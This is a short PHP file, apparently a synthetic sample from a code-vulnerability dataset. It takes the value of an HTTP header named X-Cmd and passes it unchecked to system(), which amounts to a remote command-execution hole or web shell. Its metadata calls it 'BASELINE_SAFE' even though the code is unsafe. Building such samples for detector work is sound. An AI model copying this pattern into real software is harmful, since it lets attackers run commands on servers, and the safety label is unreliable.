<?php
/* DATASET_SIGNATURE: BASELINE_SAFE_UNIQUE_V2_FIXED_HDR_META; CE_BUCKET=HEADER; CE_MODE=H_GAH_FOREACH_ISTR; SKELETON=S2; KEY=cmd; SINK=B1; VAR=v0152; HDR_NAME=X-Cmd */
function SINK_B1($command){
    system($command);
}
$h = function_exists("getallheaders") ? getallheaders() : [];
$inp = "";
foreach($h as $k=>$v){ if(strcasecmp((string)$k, "X-Cmd")===0){ $inp = (string)$v; break; } }
$inp = (string)$inp; // no value processing
class Runner {
    public static function run($x){
        return SINK_B1($x);
    }
}
$out = Runner::run($inp);
echo (string)($out);
?>
